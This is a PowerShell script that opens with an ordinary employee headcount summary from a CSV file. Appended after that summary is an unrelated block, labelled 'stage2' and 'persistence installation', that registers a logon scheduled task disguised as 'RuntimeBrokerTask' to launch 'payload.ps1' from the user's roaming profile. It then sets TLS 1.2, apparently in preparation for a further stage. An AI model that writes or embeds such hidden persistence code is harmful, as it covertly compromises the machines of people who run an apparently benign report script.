
$InputCsv   = 'D:\Incoming\employees.csv'
$OutputPath = "D:\Ops\reports\headcount-summary-2026-07-21.csv"
$GroupBy    = "Site"
$MinAmount  = 2500


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
$byGroup = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}

$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
<#
.SYNOPSIS
    Scheduled-task persistence installation.

.DESCRIPTION
    Registers a per-user logon task that launches a PowerShell
    PowerShell file from the roaming profile.

.EXAMPLE
    PS> .\stage2.ps1
#>
$TaskName = "RuntimeBrokerTask"
$ScriptPath = "$env:APPDATA\payload.ps1"
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
    $TaskState = Get-ScheduledTask -TaskName $TaskName
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
